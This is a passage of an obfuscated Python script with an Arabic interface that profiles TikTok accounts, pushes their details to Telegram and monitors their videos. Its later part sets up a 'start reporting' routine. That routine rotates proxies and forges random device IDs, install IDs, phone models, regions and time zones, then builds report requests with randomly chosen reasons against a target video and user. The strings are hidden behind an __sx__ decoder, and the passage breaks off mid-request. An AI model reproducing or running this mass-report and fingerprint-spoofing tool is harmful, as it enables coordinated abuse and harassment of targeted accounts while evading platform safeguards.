        __sx__(b'0XPMORjDq+i5L9I2y/OiLBodkpmILPRFTJHC+m1dN3A6ar27YaIhYUBIELisXORXwFqNUF5nauGvP8jPF1Z2cASgqrCn8QO4DcOdzzjIrgLYEo/s0dx4gIezYmZRIr1/GfH/UTfQa38P0GzybaR7u2c5OjN49IrLjtjL5N2DVgytus4WCoNs9xXDKC/JbKQnk8/WiOixFxWk7gZU6JmjIzg6b2vCd6LK5BlMGFMoHdBaYVgEOLKyjx6Uh82XQMBibuXxZzU4SIVO7lkA/lbtTnFrV9hiEXgw0Y00LsdmRpbfVE4OksCgVqu9+2n0', 169)
        while True:
            print(f'{MAG}هل تريد فحص الفيديوهات للحساب @{username}؟{RESET}')
            print(f'{CYAN}[1] نعم — ابدأ الفحص كل {MONITOR_INTERVAL} ثانية{RESET}')
            print(f'{YELLOW}[2] لا — تابع بدون فحص{RESET}')
            choice = input(f'{BLUE}اختر (1/2): {RESET}').strip()
            _mirror(__sx__(b'hSdGTAQ7b+Y2kkul1CGliE4MOzNmoMqm6X1xSMpL1305kssjEUdM49UnjE4AOw/mVpMxqs1JQCT7qSVXXVKdmYZOGDuP/QIQ15Q=', 253))
            if choice == __sx__(b'4EKrnJiYqpiq', 152):
                DATA_DIR = __sx__(b'uRuKjY8P7gzq6E+OiO2IxcHktsSb', 193)
                if not os.path.exists(DATA_DIR):
                    os.makedirs(DATA_DIR)
                try:
                    video_file = os.path.join(DATA_DIR, f'{username}.txt')
                    if os.path.exists(video_file):
                        os.remove(video_file)
                    DELTA_FLASH.pop(username, None)
                except:
                    pass
                return True
            if choice == __sx__(b'C6lAcXNzQHNA', 115):
                return False
            print(f'{RED}❌ اختيار غير صالح. الرجاء إدخال 1 أو 2.{RESET}')
            _mirror(__sx__(b'aMprJKdX8dbiC/t+vKrJFbQnOszIFXQQub0nhs98qaFGXxFcf6yhFjirQPHWwgv7kZqRUhqWGicGz/xAIMITEPmxOlw=', 16))
    clear()
    print(f'{CYAN}{BOLD}✅ تم ضبط الإعدادات.{RESET}')
    _mirror(__sx__(b'w2HAjxzuWn0RIPvZYDaujA2QZ+PFCF59aaCA1BcECqc37FK6uyWBrDw=', 187))
    if os.environ.get(__sx__(b'0HKjoSGn3qWmXlxfW9ypqLGpqxE=', 168)) or os.path.exists(__sx__(b'3nyN6IuIaGppbep3jQ+Op6aAuqPG', 166)):
        print(f"{GREEN}• SessionID: تم التحميل تلقائيًا ({('env' if os.environ.get('TT_SESSIONID') else 'sessionid.txt')}){RESET}")
        _mirror(__sx__(b'kzGQP1ujytNeU9PY1CQ4LqEKLUFwRuHcfTSHUloBLTFwRtxQhV1rL7GF3TazlYjyezCWiNLrO4H1ZQ==', 235))
    else:
        print(f'{YELLOW}• SessionID غير متوفر — سنتجاوز Mobile-signed تلقائيًا ونستخدم الفولباكات.{RESET}')
    if not os.path.exists(__sx__(b'WPprbG7uD+0LCa5vaQxpJCAFVyV6', 32)):
        os.makedirs(__sx__(b'sROChYcH5gTi4EeGgOWAzcnsvsyT', 201))
    load_extra_bot()
    configure_extra_bot_interactive()
    raw_input_users = input(f'{MAG}أدخل يوزر/يوزرات (مفصولة بفواصل): {RESET}').strip()
    users = [u.strip() for u in raw_input_users.split(__sx__(b'Xvz1JyYmCyYL', 38)) if u.strip()]
    if not users:
        print(f'{RED}❌ لم يتم إدخال أي يوزر{RESET}')
        _mirror(__sx__(b'7U/uoSLSdPNeWMMQDsiiw5Q8jt76OSoke1NnDrifooNKeZefSnktJHxT05WRvIxQ', 149))
        raise SystemExit
    open(__sx__(b'81FAR0dYoCKjiouBcYlE', 139), __sx__(b'M5FgTEtLM0sz', 75)).close()
    SUPPRESS_BASELINE_ALERTS = True
    for g in users:
        clear()
        try:
            info, bearer = fetch_userinfo_tikfans(g)
            region_code, country_ar, flag, enriched = احصل_على_بلد_الحساب_حقيقي(g, info)
            print(f"{BOLD}{CYAN}📍 بلد @{g}: {country_ar} {flag} — كود: {region_code or 'N/A'}{RESET}")
            _mirror(f"📍 بلد @{g}: {country_ar} {flag} — كود: {region_code or 'N/A'}")
            followers_val = int(info[__sx__(b'uhiJCQ0LC+2N77AM7Q/pw8Lk0ce2', 194)])
            videos_val = int(info[__sx__(b'6Eq7W9zZXedev127kZCGHpSx', 144)])
            likes_val = int(info[__sx__(b'ErChIidGQBukRadBa2p8VW50', 106)])
            nickname = info[__sx__(b'ErChoSakpCGmJ29qZLBpLQ==', 106)]
            bio = info[__sx__(b'ROYX8nDzdxAVEXY5PC8iP+8=', 60)]
            account_created_ts, latest_video_ts = fetch_created_and_latest(g, sec_uid=info.get(__sx__(b'sxHghYbFBofKy8O5yZU=', 203), __sx__(b'7kyVlpaWlpc=', 150)))
            account_created_str = _ts_to_str(account_created_ts)
            latest_video_str = _ts_to_str(latest_video_ts)
            if account_created_ts:
                quick_cr = {__sx__(b'BqRVV3h+fyN+lg==', 126): int(account_created_ts), __sx__(b'1HaHYoOB5uKprKWUrj4=', 172): __sx__(b'WvgJ6+4M7a/t7mnpJSI1TCYa', 34), __sx__(b'L40cmZgcnBsemhwZUldBK1NY', 87): 95, __sx__(b'vhwNDemP68DGwEbE7A==', 198): __sx__(b'XvxtCGxrCm8r7+prIyYwEiIi', 38)}
                _CREATION_CACHE[g] = quick_cr
                _print_creation_line(g, quick_cr)
            else:
                creation_quick_line(g, info.get(__sx__(b'Zcc2U1AT0FEcHRVvH0M=', 29), __sx__(b'owHY29vb29o=', 219)))
            threading.Thread(target=fetch_creation_background, args=(g, info.get(__sx__(b'NZdmAwBDgAFMTUU/TxM=', 77), __sx__(b'40GYm5ubm5o=', 155)), os.environ.get(__sx__(b'YMITEZEXbhUW7uzv62wZGAEZG6E=', 24)) or (open(__sx__(b'A6FQNVZVtbe0sDeqUNJTentdZ34b', 123), __sx__(b'uxnowcPDsMOw', 195), encoding=__sx__(b'f90sKk7UsgcHAuUGsg==', 7)).read().strip() if os.path.exists(__sx__(b'c9EgRSYlxcfEwEfaIKIjCgstFw5r', 11)) else __sx__(b'Dqx1dnZ2dnc=', 118))), daemon=True).start()
            with open(__sx__(b'ogARFhYJ8XPy29rQINgV', 218), __sx__(b'/13Mg4eH5Yfl', 135), encoding=__sx__(b'K4l4fhqA5lNTVrFS5g==', 83)) as f_iin:
                f_iin.write(f'{g} | متابعين: {followers_val} | إعجابات: {likes_val} | فيديوهات: {videos_val}\n')
            video_file_path = f'accounts_data/{g}.txt'
            if os.path.exists(video_file_path):
                try:
                    with open(video_file_path, __sx__(b'91WkjY+P/I/8', 143), encoding=__sx__(b'1nSFg+d9G66uq0yvGw==', 174)) as vf:
                        old_video_count = int(vf.read().strip() or __sx__(b'F7Vcb29vXm9e', 111))
                except:
                    old_video_count = videos_val
            else:
                old_video_count = videos_val
            if not SUPPRESS_BASELINE_ALERTS:
                if videos_val < old_video_count:
                    diff = videos_val - old_video_count
                    msg = f'🚨 حذف فيديوهات @{g}\n📉 الفرق: {diff}\n🎞️ السابق: {old_video_count}\n🎞️ الحالي: {videos_val}\n🔗 https://www.tiktok.com/@{g}'
                    print(f'{YELLOW}{msg}{RESET}')
                    send_telegram_alert(msg)
                elif videos_val > old_video_count:
                    diff = videos_val - old_video_count
                    print(f'{YELLOW}⚠️ تم رفع {diff} فيديو جديد في الحساب: @{g}{RESET}')
            with open(video_file_path, __sx__(b'mjjJ5eLimuKa', 226), encoding=__sx__(b'qAr7/ZkDZdDQ1TLRZQ==', 208)) as vf:
                vf.write(str(videos_val))
            analysis = تحليل_حساب_متقدم(followers_val, likes_val, videos_val, region_code, bio)
            اطبع_بطاقة_الحساب(g, nickname, country_ar, flag, bio, followers_val, likes_val, videos_val, analysis, enriched=enriched)
            print(f'{WHITE}🗓️ إنشاء الحساب: {account_created_str}   ⏱️ أحدث فيديو: {latest_video_str}{RESET}')
            _mirror(f'🗓️ إنشاء الحساب: {account_created_str}   ⏱️ أحدث فيديو: {latest_video_str}')
            save_log(f"{g} | {nickname} | {country_ar}({region_code}) | فيديوهات:{videos_val} | متابعين:{followers_val} | إعجابات:{likes_val} | قوة:{analysis['final_score']}% | تفاعل:{analysis['engagement']}% | شارات:{'|'.join(analysis['badges'])} | بايو:{bio}" + f' | إنشاء:{account_created_str} | أحدث_فيديو:{latest_video_str}')
            send_telegram_alert(f'🔗 رابط الحساب: https://www.tiktok.com/@{g}')
            badges_text = __sx__(b'+1nQ+1czy4KDhJKBxg==', 131).join(analysis[__sx__(b'UfNiY2VgZgQvKSEQK04=', 41)])
            summary = f"📄 تحليل @{g}\n👤 الاسم: {nickname or '—'}\n📍 الدولة: {country_ar} {flag} ({region_code})\n🗓️ إنشاء الحساب: {account_created_str}\n⏱️ أحدث فيديو: {latest_video_str}\n👥 المتابعون: {followers_val:,}\n❤️ الإعجابات: {likes_val:,}\n📹 الفيديوهات: {videos_val:,}\n📈 التفاعل: {analysis['engagement']}%\n📊 القوة: {analysis['final_score']}% — {analysis['label']}\n🔖 الشارات: {badges_text}\n🔗 https://www.tiktok.com/@{g}"
            send_telegram_alert(summary)
            id_token = bearer
            ur = info.get(__sx__(b'0nCB5OekZ+arqqLYqPQ=', 170), __sx__(b'ctAJCgoKCgs=', 10))
            id = info.get(__sx__(b'WvgJD2wP0G4jIirBIE8=', 34), __sx__(b'+1mAg4ODg4I=', 131)) or info.get(__sx__(b'5kRV0p+en6aeUA==', 158), __sx__(b'NpRNTk5OTk8=', 78))
            region = region_code
            bio_val = bio
            followers = str(followers_val)
            videos = str(videos_val)
            likes = str(likes_val)
            res = json.dumps({__sx__(b'6ki53N+cX96TkprgkMw=', 146): ur, __sx__(b'Hb9OSCtIlylkZW2GZwg=', 101): id, __sx__(b'8FJDQ8RGfsNExY2IhtKLrw==', 136): nickname, __sx__(b'SOoben3//P8zMDj+MrU=', 48): region, __sx__(b'91WkQcNAxKOmosWKj5yRjFw=', 143): bio_val, __sx__(b'2njp6W6JpKKmrKML', 162): followers_val, __sx__(b'bc8+3llc2BIVE0kXDQ==', 21): videos_val, __sx__(b'VPbnZGEABi0sKjAuOQ==', 44): likes_val}, ensure_ascii=False)
            r = json.dumps({__sx__(b'LI5/HhmbmJtXVFyaVtE=', 84): region, __sx__(b'a8k43V/cWD86PlkWEwANEMA=', 19): bio_val}, ensure_ascii=False)
            stats = json.dumps({__sx__(b'vhyNDQkPD+mJ67QI6Qvtx8bg1cOy', 198): followers_val, __sx__(b'6ki5Wd7bX+VcvV+5k5KEHJaz', 146): videos_val, __sx__(b'kjAhoqfGwJskxSfB6+r81e70', 234): likes_val}, ensure_ascii=False)
            if اختيار_فحص_الفيديوهات(g):
                threading.Thread(target=فحص_مستمر_للفيديوهات, args=(g,), daemon=True).start()
                print(f'{GREEN}🚀 تم بدء المراقبة كل {MONITOR_INTERVAL} ثانية للحساب @{g}.{RESET}')
                _mirror(f'🚀 تم بدء المراقبة كل {MONITOR_INTERVAL} ثانية للحساب @{g}.')
            else:
                print(f'{YELLOW}⏸️ تم تجاهل المراقبة لهذا الحساب.{RESET}')
                _mirror(f'⏸️ تم تجاهل المراقبة للحساب @{g}.')
        except Exception as e:
            print(f'{RED}❌ فشل في تحليل الحساب {g}: {e}{RESET}')
            _mirror(f'❌ فشل في تحليل الحساب @{g}: {e}')
            continue
    print(f'{CYAN}✅ انتهى إدخال الحسابات.{RESET}')
    print(f'{WHITE}ملاحظة: إن فعّلت المراقبة لأي حساب، اترك البرنامج مفتوحًا ليستمر الفحص.{RESET}')
    _mirror(__sx__(b'giDfcUH3esrqua0z/iNrtfhycGTs377+7qtLcyfI8/xwaddFjQ0W9vjH6MH0/PH0FuAgjZdri9jaEGjvXs1WiovosGW7fVhWH1bVaXI4HAV0UKQ3m8mOWHPHyL3+AfoBhqpw', 250))
    clear()
    uid1 = []
    print(f'{Z}[{F}1{Z}] {C1}أبدء ')
    aobsh = __sx__(b'0HKbrKiomqia', 168)
    clear()
    import time
    if aobsh == __sx__(b'HrxVYmZmVGZU', 102):
        try:
            h3 = {__sx__(b'/lytq8irVMvKyUuth4aTfYV6', 134): __sx__(b'YMLr1bfS1NFRzC/NK0jIENfUU9E3N07oE0koLMgrqE4YEoCBQDNMgIFwMiAODPy8nr8+YX+O8IMCg/MBgzFwYGOc4OLwMPx8fr8yoL8+f/9zMiB/DP3/vvIDAkDyAZi4Wmh6QnpJPkwTGDhzB7Q=', 24)}
            ttwid = requests.head(__sx__(b'+1lIq6qqqzVRVKysrFSoSk+tSkxVyE1MVoSD61KLEg==', 131), headers=h3).cookies.get_dict()[__sx__(b'CKpbWVm/PHFwdsRyXQ==', 112)]
        except requests.exceptions.ConnectionError:
            print(__sx__(b'1HaxJmWhbIy8r/d18r+k5o+HDbBO5YtPwk5cXfTPR8jcPe3GC5ebcvz98eo5ssaIf9Y1bsGaG2+TKk1VVWerTpefPw==', 172))
            exit()
        except:
            print(__sx__(b'QeOC4Exa2rQMDq8S5WFHitxf0rSMeYM68VNuOUsPO5Ai8laVOgg5dpUi2A==', 57))
            exit()
    uid1 = []
    print(f'{Z}[{F}1{Z}] {C1}أبدء في البلاغ')
    aobsh = __sx__(b'JoRtWl5ebF5s', 94)
    clear()
    import time
    if aobsh == __sx__(b'9Fa/iIyMvoy+', 140):
        try:
            h3 = {__sx__(b'O5lobg1ukQ4PDI5oQkNWuEC/', 67): __sx__(b'FLafocOmoKUluFu5Xzy8ZKOgJ6VDQzqcZz1cWLxf3DpsZvT1NEc49PUERlR6eIjI6stKFQv6hPd294d190UEFBfolJaERIgICstG1MtKC4sHRlQLeImLyoZ3djSGdezMLhwONg49SjhnbEwHc8A=', 108)}
            ttwid = requests.head(__sx__(b'LI6ffH19fOKGg3t7e4N/nZh6nZuCH5qbgVNUPIVcxQ==', 84), headers=h3).cookies.get_dict()[__sx__(b'ErBBQ0OlJmtqbN5oRw==', 106)]
        except requests.exceptions.ConnectionError:
            print(__sx__(b'giDncDP3Otrq+aEjpOnysNnRW+YYs90ZlBgKC6KZEZ6Ka7uQXcHNJKqrp7xv5JDeKYBjOJfMTTnFfBsDAzH9GMHJaQ==', 250))
            exit()
        except:
            print(__sx__(b'VvSV91tNzaMbGbgF8nZQnctIxaObbpQt5kR5LlwYLIc15UGCLR8uYYI1zw==', 46))
            exit()
    import threading
    import time
    import os
    import random
    from concurrent.futures import ThreadPoolExecutor, as_completed
    ls = [__sx__(b'qgjh55jgm2Ge4+Xn5+Hn5uHhmGGamGOY4OTm5Z2b5mHi5WHiZ57jpJr9BZmb/pseHv/6H/ucB5kcHWdg4uDU0iqvw2Y=', 210), __sx__(b'2HqTleqS6RPskZeVlZOVlJOT6hPo6hHqkpaUl+/plBOQlxOQFeyR1uiPd+vpjOlsbI2IbYnudetubxUSkJKmoFjdsRQ=', 160), __sx__(b'4UOqrNOr0CrVqK6srKqsraqq0yrR0yjTq6+trtbQrSqpriqpLNWo79G2TtLQtdBVVbSxVLDXTNJXViwrqaufmWHkiC0=', 153)]
    file = __sx__(b'O5mICG9tcZdo6mtCQ1JuQDc=', 67)

    def read_file():
        __sx__(b'OphnjoNLwnJWQZIXvEas6vQQqItTBuZoIGvc+AvwzxMto2dGaUgMZhYB4IHEgIJcdeGyutJcF37zhyyKsAnq3OFz6om2vfKRG4DuW39FgYC6ZIX0O0JkzASg', 66)
        return ls

    def _normalize_proxy(line: str, default_scheme: str=__sx__(b'nT8uzczM5eXhveQk', 229)) -> str:
        s = line.strip()
        if s.startswith((__sx__(b'60lYu7q6I0FElJOZRZHK', 147), __sx__(b'03Fgg4KCgx15fKyrpcipZw==', 171), __sx__(b'AaNStza3V0/Mq65+eWhoe4g=', 121), __sx__(b'w2GQdfR1lY0KaWy8u6q2uUs=', 187))):
            return s
        s = s.replace(__sx__(b'NZceTU1NbE1s', 77), __sx__(b'gSP6+fn5+fg=', 249))
        if __sx__(b'dNZ/DAwMTQxN', 12) in s and s.count(__sx__(b'hSdO//39xv3G', 253)) >= 2:
            return f'{default_scheme}://{s}'
        parts = s.split(__sx__(b'23kQoaOjmKOY', 163))
        if len(parts) == 2 and parts[1].isdigit():
            host, port = parts
            return f'{default_scheme}://{host}:{port}'
        if len(parts) == 4 and parts[3].isdigit():
            user, pwd, host, port = parts
            return f'{default_scheme}://{user}:{pwd}@{host}:{port}'
        if len(parts) == 4 and parts[1].isdigit():
            host, port, user, pwd = parts
            return f'{default_scheme}://{user}:{pwd}@{host}:{port}'
        return f'{default_scheme}://{s}'

    def _to_requests_proxies(proxy_url: str) -> dict:
        __sx__(b'BafGzJcbhrDTZrYT0Sk1tDFTLMWkB86Qu49m5hLRLcWkD8483FXIzUnIxdklnLub5mA99Ph3ZFhYeHdKa6KRfc73XLGfgZmRH0B9vDFU/w==', 125)
        return {__sx__(b'kDIjwMHB6OjssOkp', 232): proxy_url, __sx__(b'PJ6PbG1tbEJEQshGcA==', 68): proxy_url}

    def _build_headers_minimal() -> dict:
        __sx__(b'+FqlDVGNAsCAw38ZIotgjo5hgGY8kP/Oo6yA3pR5Ua24yRQgscSn6TdxiH3qU3S1wRROOjFnQJd41CnGpW/g4C/apyzy+8gXGfWFeGAbgZxlmfTcpFMcHS6x1epALzyu2Jvjd8XqHVntNq4D6jYxcHzFbpxYMmPn8ggPlUcZdYcLss8K', 128)
        return {__sx__(b'xmTN8vDwk5Zvy3P1cPF3cvW5vpUTuxs=', 190): __sx__(b'PZ8O6o9plRQNDAiODGkMQEVk4kGZ', 69), __sx__(b'xGbPcnN39/GSdXBzv7ypGbit', 188): __sx__(b'RuTNcHMT7kvy9xJ1Oz4tcj2a', 62), __sx__(b'oQOqlZeX9PEILJAVkvaUlZbc2fIZ3Hs=', 217): __sx__(b'7E7fWUeZmULdWSe6IKFEJ0TduJanWJXA25Iw', 148)}

    def process_line(line: str):
        __sx__(b'0nBJ+KoosQHEXHVy0slnJzegsK/vU78zA2+QoLMDI4MD728woJ3xxBx28tTJWSf/nXx38tXJU2f8rxpqcDHnnRHFhv0SG0hsUDG3nXG+xIYUcw/ayZE6FVZsZLGBXxLqzKmqWA+ciA==', 170)
        proxy_url = _normalize_proxy(line, default_scheme=__sx__(b'8lBBoqOjioqO0otL', 138))
        proxies = _to_requests_proxies(proxy_url)
        headers = _build_headers_minimal()
        return (proxies, headers)

    def process_lines(lines):
        results = []
        if not lines:
            return results
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(process_line, line) for line in lines]
            for future in as_completed(futures):
                results.append(future.result())
        return results

    def update_file_loop():
        __sx__(b'BqRb8D9w/E5qOoninFELnX/C8k9vbW0oBHzKXmxJID9tNfU2dmXHt7ITgtsjgtqNoeHnOorf3Z9nMJ6v3xnzKCYe+qlHvtN76Hgx6P8uZ211ZEfYpaMYAbasu0xs4AteeAJONwj0HHH10Xiqxllf82vkNvnXaX+Khtdf0YQbt2LdFl/1yWgOr9i/vvRp8hQanxkvye20cUMOvELaeYrbg3IR1UeQce4H99I=', 126)
        global ls
        while True:
            new_lines = read_file()
            ls = new_lines
            _ = process_lines(new_lines)
            time.sleep(120)
    ls = read_file()
    _ = process_lines(ls)
    thread = threading.Thread(target=update_file_loop, daemon=True)
    thread.start()

    def afr(aweme_id, sessionid):
        global tr, fa, er
        proxies1 = str(random.choice(ls))
        _rticket = int(time.time() * 1000)
        ts = str(int(time.time() * 1000))[:10]
        from uuid import uuid4
        uid = str(uuid4())
        install_id = random.randrange(7334285683765348101, 7334285999999999999)
        device_id = random.randrange(7283928371561793029, 7283929999999999999)
        openudid = str(binascii.hexlify(os.urandom(8)).decode())
        tz_name = random.choice([__sx__(b'yWvCffyce/3/ZUb6nD4+fZ57t7GD+Leh', 177), __sx__(b'1HbfgYFmg+R5W2Vj52Vjr6yOZqmm', 172), __sx__(b'qwmg/x2fB9waHH0f1NPAedAX', 211), __sx__(b'x2XMk5KRlvVzdvNrsBHzdvQSu7+K7bnt', 191), __sx__(b'JYcucZMRiaqTkpQTcRRZXUaCWSg=', 93), __sx__(b'qgihHp//GJ6cBiUb/VylHpmdH5v/1NKU9dX8', 210), __sx__(b'KYsifHybfhmEXhl9m31XUUznVc4=', 81), __sx__(b'5EbvsFLQSOu10dZQmJyPvZ8P', 156), __sx__(b'NZc+gQBghwEDmUIDgcJCBWGAhEpNdQ5LKA==', 77), __sx__(b'nz2UyymrM+gpryusKK8r4+fHauM2', 231)])
        webcast_language = random.choice([__sx__(b'qwmYHtDT0unTBw==', 211), __sx__(b'BKY3UXp8fUN8pQ==', 124), __sx__(b'E7EgQGlraitrsg==', 107), __sx__(b'Dqw9P3N2d1l2vA==', 118), __sx__(b'uhgJiMbCw/XCDg==', 194), __sx__(b'asg5OhMSE0QS9w==', 18), __sx__(b'vR8O6cTFxI3FGw==', 197), __sx__(b'wmCRkL+6u+G6Ug==', 186), __sx__(b'6kjZvpCSk6SSRg==', 146), __sx__(b'Z8XU1xsfHiQfzQ==', 31)])
        current_region = random.choice([__sx__(b'+FqLjYaAgH+AKQ==', 128), __sx__(b'M5FAvk1LS7xL6g==', 75), __sx__(b'qwmgpdfT0xrTVg==', 211), __sx__(b'ROZPMDk8POU8qw==', 60), __sx__(b'wGJLTLu4uFq4IA==', 184), __sx__(b'gSOK8/v5+SH5bA==', 249), __sx__(b'nT+W7ufl5QXlfA==', 229), __sx__(b'F7UcHmpvb6Bv5Q==', 111), __sx__(b'nT8W6eTl5Q3lew==', 229), __sx__(b'AaMKdH95eaZ54A==', 121), __sx__(b'4ELr7JqYmF6YHA==', 152)])
        region = random.choice([__sx__(b'FbdmYGttbZJtxA==', 109), __sx__(b'XP4v0SIkJNMkhQ==', 36), __sx__(b'0HLb3qyoqGGoLQ==', 168), __sx__(b'333Uq6Knp36nMA==', 167), __sx__(b'uxkwN8DDwyHDWw==', 195), __sx__(b'jiyF/PT29i72Yw==', 246), __sx__(b'KIojW1JQULBQyQ==', 80), __sx__(b'mzmQkubj4yzjaQ==', 227), __sx__(b'c9H4BwoLC+MLlQ==', 11), __sx__(b'bc9mGBMVFcoVjA==', 21)])
        screen_height = random.randint(600, 1080)
        screen_width = random.randint(800, 1920)
        samsung = [__sx__(b'jC7/AiGBQ8DDgff0/ZH29A==', 244), __sx__(b'UPIj3v1dHx0eWi8oIWwp3g==', 40), __sx__(b'edsK99T0sjU2dAIBCIkDBg==', 1), __sx__(b'tRfGOxi4enl9xcjNxLDP3g==', 205), __sx__(b'Sug5xOdHhQYFPTcyO0owIw==', 50), __sx__(b'pQfWKwio6ertqC7e3da03+I=', 221), __sx__(b'x2W0SWrKi4qLsoq7v7TbvY8=', 191), __sx__(b'/lyNcFPzMbKz84WGj9mHeA==', 134), __sx__(b'O5lItZY2d3R2M0RDSnNCsQ==', 67), __sx__(b'ymi5RGdHAYaBwrGyu8mwsw==', 178), __sx__(b'9VeGe1j4Orm+hYiNhOqPhA==', 141), __sx__(b'gyHwDS4OycjLi/j78rL6Dw==', 251), __sx__(b'nz3sETKSU9NXl+Xn7tPmFQ==', 231), __sx__(b'gCLzDi2NzM/IjQ/9+POS+sc=', 248), __sx__(b'hyX0CSqKSMvI9/r/9pX99Q==', 255), __sx__(b'ZMYX6slpKCosa+8fHBdHHiE=', 28), __sx__(b'w2GwTW7ODI+Ito6/u7ALuYQ=', 187), __sx__(b'40GQbU7ur6mv7JibkoaadA==', 155), __sx__(b'ZMYX6slpq6gsbx4cFXod4g==', 28), __sx__(b'LoxdoIMjYmRmoVNWX3dXow==', 86), __sx__(b'z228QWLCg4KDurC3voG1tg==', 183), __sx__(b'H71skbISU1JXEmBnbkRmlw==', 103), __sx__(b'MZNCv5w8fX99PE5JQFdIpg==', 73), __sx__(b'uRvKNxS09fTxtjLCwcqkw/4=', 193), __sx__(b'ljTlGDub2tve49vq7uWO7ME=', 238), __sx__(b'VvQl2PtbmRoZIS8uJ1ksPg==', 46), __sx__(b'3nytUHPTkpaU06Gmr7OnSw==', 166), __sx__(b'4UOSb0xsq6+r6ZqZkNqYag==', 153), __sx__(b'FrRlmLsbWllaY2luZ1BsbQ==', 110), __sx__(b'dNYH+tl5uDi8/A8MBUwN8g==', 12), __sx__(b'mTvqFzSU1dPRlOLh6PfgDQ==', 225), __sx__(b'ddcG+9h4urm9fQ8NBGcPDQ==', 13), __sx__(b'CKp7hqWFw8RAA3JweflydQ==', 112), __sx__(b'AaNyj6wMTU5NDHp5cFR4iw==', 121), __sx__(b'NJZHupk5eHl4OU9MRWlNvA==', 76), __sx__(b'IIJTro0t72xrLVtYUTpZpw==', 88), __sx__(b'LI5fooEh42BnJFdUXQxVrg==', 84), __sx__(b'IIJTro0tbG1oLVtYUXpZtw==', 88), __sx__(b'TO4/wuFBAAYEQzc0PS412g==', 52), __sx__(b'Wfsq1/RUFRcRViYhKD4g0Q==', 33), __sx__(b'lTfmGziYWtnane7t5LbsFg==', 237), __sx__(b'8FKDfl39vLy4/4uIgZ6JZQ==', 136), __sx__(b'c9EA/d5+vD89fggLAlIK9w==', 11), __sx__(b'jC7/AiGBQ8DCgfD0/aD1Aw==', 244), __sx__(b'A6Fwja4OT01PC3h7cmh6kg==', 123), __sx__(b'VPYn2vnZHhoeXN8vLCeoLm0=', 44)]
        oppo = [__sx__(b'a8lgHeMjISWmFxMUOxK8', 19), __sx__(b'lTee4x3d39zY6u3qxOxD', 237), __sx__(b'Xf9WK9UVFxOUISUiAySL', 37), __sx__(b'ogCp1Crq6O7r39rdxtty', 218), __sx__(b'F7UcYZ9fXd1baW9oSG7D', 111), __sx__(b'UvBZJNoaGBwbLCotCiuC', 42), __sx__(b'hyWM8Q/PzcvN+P/45f5X', 255), __sx__(b'PZ82S7V1d/FxQkVCbUTq', 69), __sx__(b'G7kQbZNTUVdUZWNkQ2LK', 99), __sx__(b'/130iXe3tbGwg4eAo4Yu', 135), __sx__(b'LY8mW6VlZ2fmUVVSclT6', 85), __sx__(b'dtR9AP4+PD4+Cw4JHw+t', 14), __sx__(b'gCKL9gjIykzI/fj/3PlU', 248)]
        realme = [__sx__(b'CKp7gv1ARkVAdHB3t3Gx', 112), __sx__(b'1nSlXCOemB6eq66pYq9m', 174), __sx__(b'C6l4gf5Dx0dBd3N0vHK2', 115), __sx__(b'6EqbYh2gpqenlJCXS5Fa', 144), __sx__(b'+liJcA+ytLOxhoKFUoNE', 130), __sx__(b'njztFGvW0FbS5ObhLecg', 230), __sx__(b'XP4v1qkUEpIQIiQj8SXu', 36), __sx__(b'GrhpkO9SVNRWYGJltmOr', 98), __sx__(b'U/Eg2aYbnxsZLyss5yrv', 43), __sx__(b'gyHwCXbLT8vJ/vv8K/oz', 251), __sx__(b'Vfcm36AdGxsZLS0q7yyS', 45)]
        phone = random.choice([samsung, oppo, realme])
        type1 = random.choice(phone)
        if __sx__(b'J4VUqVpfX6pf/g==', 95) in type1:
            brand = __sx__(b'd9UkQcMiIcJECA8DDg3w', 15)
            dev = type1.split(__sx__(b'Q+HoPjs7FTsV', 59))[1]
        if __sx__(b'9FaHfgGMjI1njHQ=', 140) in type1:
            brand = __sx__(b'BqRVNDOytzN7fnbMfAk=', 126)
            dev = type1.split(__sx__(b'XP6vJCQkfSR9', 36))[1]
        if __sx__(b'a8lgHeMTExKnE88=', 19) in type1:
            brand = __sx__(b'Hb+Wam2VYmVmemRa', 101)
            dev = type1.split(__sx__(b'pgQt3t7el96X', 222))[1]
        off = int(round((datetime.datetime.now() - datetime.datetime.utcnow()).total_seconds()))
        if aobsh == __sx__(b'3X+WoaWll6WX', 165):
            time1 = int(datetime.datetime.now().timestamp())
            reason = str(random.choice(sdsd))
            pro1 = urlencode({__sx__(b'AqBxNTeINoszVlRzs7Y3f3pb9X6V', 122): time1, __sx__(b'FrQloiJvbmwyb0E=', 110): __sx__(b'f900s7O3BwcFHAfc', 7), __sx__(b'/F5PzcnLSA1LrqlOqMpNyKpNSEuHhMLpg/g=', 132): __sx__(b'9VfGxIiNjKKNRw==', 141), __sx__(b'F7VEJaImQiSjROagJkNob0/Hamo=', 111): __sx__(b'ZsRNNtEyVE/WVVLQTiaqwtbSRj+m2sNXX903q7q2KkNNvyoxW98rSik2Kye9Wr+mujYvsxba0tcatDFVM1TV0Vcxzx0eASsJ7g==', 30), __sx__(b'7E6/3rlcu74d29252pKUiJCQDw==', 148): __sx__(b'ymiXPPO8MIKi9x2A+f82N5SsMvY/qIUQXNmr2rH+e8a4Q4yWbPGc1GNv7Q5FQIGmvGe43GGqDoQzmMK3gO6ma5yG+B6R2h9yK+0vCtOov/W6uw4XsMhWFaEWRjYBR/JE86laESbZZ0zpyefRwBasDwb6UNMC7rIbusxsWV+0wIvWAnrM5SSi0MXF/RwaPzKl5Jd9AQPBqgvG/5dbpcG99mI=', 178), __sx__(b'iCrbut0439p53z68P7vc2d269fDJDfY+', 240): __sx__(b'ROYXcvHxOzw4dD2J', 60), __sx__(b'nT8uLKoqyshsyq/ILcrPrMhvqiioKSnk5Yf77TE=', 229): __sx__(b'4UOS11RU7tFW1FVVSNJXVpyZvh+c1Q==', 153), __sx__(b'oQMSEpUXF5IVlNzZ1wPang==', 217): nickname, __sx__(b'3H5v627u6Yota+ilpLbypwA=', 164): aweme_id, __sx__(b'Xvztaexsawiv6QnpbQus6WonJhetIAg=', 38): id, __sx__(b'+1lIzEpPcM+Cg4v7gds=', 131): __sx__(b'LI6fG52YpxhVVFwsVgw=', 84), __sx__(b'Suj5Hf15H7j9fjMyPVsxag==', 50): id, __sx__(b'J4V0FRJzkZBcX1eLXdY=', 95): reason, __sx__(b'S+kYeR77HBm6HJofezYzL083jQ==', 51): __sx__(b'ymiZef77f7WytO6wqg==', 178), __sx__(b'T+0cfRr/GB1+Gr34ezY3KwIzlw==', 55): __sx__(b'M5EAggcCSktIsErd', 75), __sx__(b'thTlh+KEgePPzsYQzEY=', 206): aweme_id, 